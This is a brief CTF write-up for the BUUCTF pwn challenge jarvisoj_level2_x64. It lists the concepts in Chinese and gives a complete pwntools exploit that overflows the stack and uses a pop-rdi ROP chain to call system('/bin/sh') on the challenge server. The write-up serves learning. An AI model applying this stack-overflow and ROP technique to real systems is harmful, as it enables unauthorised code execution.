---
title: "BUUCTF Pwn Jarvisoj_level2_x64"
date: 2020-03-28T18:42:12+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Jarvisoj_level2_x64

考点

1、64位汇编函数传参方式

2、基础ROP，pop rdi; ret

3、栈溢出

![image-20200328184928153](/images/image-20200328184928153.png)

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-

from pwn import *
#sh = process('./jarvisoj_level2_x64')
sh = remote('node3.buuoj.cn',28085)
elf = ELF('./jarvisoj_level2_x64')

fakerbp = 0x8
offset = 0x80 + fakerbp
binsh_addr = 0x600a90
system_addr = elf.symbols['system']
pop_rdi_ret = 0x4006b3
payload = 'a'*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
sh.sendlineafter('Input:\n',payload)
sh.sendline('cat flag')
sh.interactive()
```

